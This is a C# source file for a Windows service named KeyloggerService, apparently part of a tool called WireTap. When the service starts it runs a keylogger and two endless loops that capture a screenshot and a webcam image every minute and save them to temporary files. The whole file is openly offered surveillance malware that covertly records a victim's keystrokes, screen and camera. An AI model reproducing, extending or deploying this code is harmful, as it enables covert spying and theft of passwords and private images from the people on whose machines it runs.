namespace WireTap.WindowsService
{
    using System;
    using System.Collections.Generic;
    using System.ServiceProcess;
    using System.Threading.Tasks;

    internal partial class KeyloggerService : ServiceBase
    {
        public KeyloggerService()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            Console.WriteLine("Executing KeyloggerService OnStart");
            var startKeyloggerTask = Task.Factory.StartNew(() => StartKeylogger());

            var tasks = new List<Task>
            {
                startKeyloggerTask,
                StartScreenshotServiceAsync(),
                StartWebCameraServiceAsync()
            };

            Console.WriteLine("Starting services");
            Task.Run(async () => await Task.WhenAll(tasks)).Wait();
        }

        protected override void OnStop()
        {
            Console.WriteLine("OnStop : Stopping services");
        }

        public void StartKeylogger()
        {
            Console.WriteLine("Inside StartKeylogger");
            Keyboard.StartKeylogger();
        }

        public async Task StartScreenshotServiceAsync()
        {
            Console.WriteLine("StartScreenshotServiceAsync");

            while (true)
            {
                try
                {
                    Console.WriteLine("Inside captureScreenshot");
                    var tempFile = Helpers.CreateTempFileName(".jpeg", "screenshot-");
                    Display.CaptureImage(tempFile);
                    Console.WriteLine("[+] Screenshot captured at: {0}", tempFile);
                    await Task.Delay(TimeSpan.FromMinutes(1));
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message + '\n' + ex.StackTrace);
                    await Task.Delay(TimeSpan.FromMinutes(1));
                }
            }
        }

        public async Task StartWebCameraServiceAsync()
        {
            Console.WriteLine("StartWebCameraServiceAsync");

            while (true)
            {
                try
                {
                    Console.WriteLine("Inside captureWebCam");
                    string tempFile = Helpers.CreateTempFileName(".jpeg", "webcam-");
                    WebCam.CaptureImage(tempFile);
                    Console.WriteLine("[+] WebCam captured at: {0}", tempFile);
                    await Task.Delay(TimeSpan.FromMinutes(1));
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message + '\n' + ex.StackTrace);
                    await Task.Delay(TimeSpan.FromMinutes(1));
                }
            }
        }
    }
}